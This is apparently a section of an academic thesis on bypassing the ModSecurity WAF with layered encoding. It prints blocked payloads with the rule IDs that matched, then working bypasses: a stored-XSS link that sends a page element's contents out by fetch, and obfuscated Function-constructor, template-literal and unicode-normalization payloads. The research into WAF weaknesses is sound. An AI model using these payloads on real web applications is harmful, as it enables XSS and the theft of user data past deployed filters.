\subsection{Multi Iteration Evaluation}
\label{sec:multiiteration}
This chapter states the evaluation results of multiple iterations of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of finally blocked requests are referred to in attachment.


\subsubsection{Percent encoding + Unicode in JSON}
The ModSecurity firewall blocks requests containing unicode escaped characters in JSON. (see Section~\ref{sec:unicodeinjsontest})
In order to evade this rule, a payload containing a unicode escaped character was percent-encoded previous to submission.
The ModSecurity firewall detected the unicode escape regardless and rejects the request:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode escape in json with additional percent encoding, label={lst:jsonunicodeurlenctest}]
<payload>urllib.parse.quote('{ "body": "alert\\u0024{1}" }')</payload>
<payload>%7B%20%22body%22%3A%20%22alert%5Cu0024%7B1%7D%22%20%7D</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}


\subsubsection{Double Percent encoding}
The payload from Listing~\ref{lst:urlencodedexampleblocked} was blocked by the ModSecurity firewall.
On usage of double Percent encoding , the rules with ids \verb|932130, 941390| no longer triggered and the payload bypasses the WAF:

\begin{lstlisting}[style=basicStyle, caption=url encoded example pass, label={lst:doublepercentencoding}]
urllib.parse.quote(urllib.parse.quote('alert(`${new Date()}`)'))
returns
alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529
\end{lstlisting}

However, this payload would not be valid unless the target also performs multiple step url decoding. Multiple step url decoding is forbidden according to RFC3986 "Uniform Resource Identifier (URI): Generic Syntax" - Section 2.4:
\begin{quote}
	Implementations must not
	percent-encode or decode the same string more than once, as decoding
	an already decoded string might lead to misinterpreting a percent
	data octet as the beginning of a percent-encoding, or vice versa in
	the case of percent-encoding an already percent-encoded string.
\end{quote}


\subsubsection{HTML encoding + JavaScript normal character escape}
\label{sec:htmlencjsesc}
The following payload could be used by an attacker intending to employ stored XSS to exfiltrate secrets \cite{swigger/storedxss}.
It was blocked by the ModSecurity firewall based on 4 rule triggers:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
<payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a></payload>

<message>"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "88"] [id "934110"]<fileDetails>
<MatchedData>"http://localhost"</MatchedData>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "225"] [id "941170"]<fileDetails>
<MatchedData>"javascript:[...]"</MatchedData>

<message>"Node-Validator Deny List Keywords"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "252"] [id "941180"]<fileDetails>
<MatchedData>".innerhtml"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "323"] [id "941210"]<fileDetails>
<MatchedData>"javascript:v"</MatchedData>
\end{lstlisting}

As the payload is meant to be injected into an html document, HTML escaping can be used to escape certain characters.
On escaping of the character \verb|a| in \verb|j&#97vascript|, the payload evaded the rules with ids \verb|941170| and \verb|941210|.
On escaping the \verb|.| in \\ \verb|getElementsByName('name')[0]&#46innerHTML|, the payload evaded rule \verb|941180|.
Finally one of the \verb|/| in the url-string given to the JavaScript function \verb|fetch| is escaped by prepending it with a \verb|\|.
Escaping any normal character with a \verb|\| is allowed in JavaScript (Section~\ref{sec:jsescape}) and successfully made the payload evade the last remaining rule: \verb|934110|.
The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=stored xss bypass payload]
<a href=j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)>ClickMeFor$</a>
\end{lstlisting}


\subsubsection{Function constructor + String concatenation}
\label{sec:funconstrconbypass}
In this test, the payload logic should include multiple statements and reveal a secret by accessing a property.
The basic implementation was blocked by the ModSecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=function constructor blocked, label={lst:funconblocked}]
<payload>new Function('var s = "secret";prompt("something", s)')()</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"new Function("</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"prompt("</MatchedData>
\end{lstlisting}

To evade rule with id \verb|934100|, calling the \verb|Function()| constructor was substituted with \verb|[]['constructor']['constructor']()|. Using string concatenation to replace the character sequence \verb|'prompt'| with \verb|'promp + t'| successfully made the payload evade rule \verb|941390| and bypass the WAF. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using square bracket notation]
[]['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 

\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation]
[].constructor.constructor('var s = "secret";promp' + 't("something", s)')()
\end{lstlisting}

\subsubsection{Avoiding ()}
\label{sec:avoidingbypassA}
In the context of testing firewall evasion techniques, the author faced the question if it was possible to create payloads without  \verb|()|. Those payloads still need to be valid and bypass the waf.
Considering the bypassing payload from \ref{sec:funconstrconbypass}, opening and closing \verb|()| can be substituted with Tagged Template Literals. This caused another firewall rule to trigger:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=avoiding () blocked, label={lst:avoiding () blocked}]
<payload>[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something${s}`'}```</payload>

<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${s}`}"</MatchedData>
\end{lstlisting}

Evading rule \verb|932130| was possible by using a form of unicode escaping in JavaScript that was introduced with ES6 and differs from the unicode escaping in JSON. The character sequence \verb|${s}| was replaced with \verb|\u{0024}{s}|. This made the payload bypass the ModSecurity firewall. The bypassing payload:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using square bracket notation]
[]['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using dot notation]
[].constructor.constructor`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```
\end{lstlisting}

It is conspicuous that the payload could bypass the firewall with only the later \verb|$| of the two placeholders: \verb|${expression}| escaped.
This seems to be a bug in the WAF or the ruleset.
It is also what enables the above payload to be valid.
A substitution of the earlier \verb|$| with an escaped variant is not possible.
JavaScript does not recognize the placeholder in the Template Literal without the explicit character \verb|$|.
Substitution of the second placeholder is possible because it happens inside a string containing the Tagged Template Literal.

If the webserver is using unicode normalization (NFKC) to normalize incoming requests, the character \verb|$| can also be replaced with another character in unicode that gets normalized to it to create a valid bypassing payload. It was tested with the small dollar sign U+FE69. In this case it was neccessary to use Percent encoding in addition to avoid that the WAF flags the Unicode escape sequences as \quotes{Possible Unicode character bypass detected}:

\begin{lstlisting}[style=basicStyle, caption=avoiding () bypass payload using unicode normalization]
urllib.parse.quote("[]['constructor']['constructor']`a\uFE69{'var s = \"secret\";promp' + 't`something\uFE69{s}`'}```")
returns
%5B%5D%5B%27constructor%27%5D%5B%27constructor%27%5D%60a%EF%B9%A9%7B%27var%20s%20%3D%20%22secret%22%3Bpromp%27%20%2B%20%27t%60something%EF%B9%A9%7Bs%7D%60%27%7D%60%60%60
\end{lstlisting}
% console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

\subsubsection{Avoiding \{\}}
\label{sec:avoidingbypassB}
A payload thats not using any \verb|{}| but still allows for Tagged Template Literals or other usages of \verb|{}| can be created using string replace strategies. Considering the payload from the previous Section~\ref{sec:avoidingbypassA}, the similar payload in Listing~\ref{lst:stringreplaceblocked} was being blocked by the modsecurity firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=blocked for \$\{\} payload, label={lst:stringreplaceblocked}]
<payload>[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}`')();</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${2 2}"</MatchedData>
\end{lstlisting}

On using a string replace strategy like mentioned in \ref{sec:stringreplace}, a payload in the form of

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using square bracket notation, label={lst:stringreplacepass}]
[][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}

successfully evaded the firewall.

Similarly, using the dot-syntax instead of bracket-access, the following payload bypasses the firewall: 

\begin{lstlisting}[style=basicStyle, caption=avoiding {} bypass payload using dot notation, label={lst:stringreplacepass}]
[].constructor.constructor('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '2+2' + [open + []][0][36] + ':`')();
\end{lstlisting}




\subsubsection{Forcing unicode normalization}
{\color{red} TODO: what happens if a string followed by .normalize('NFKC') is sent as payload?}
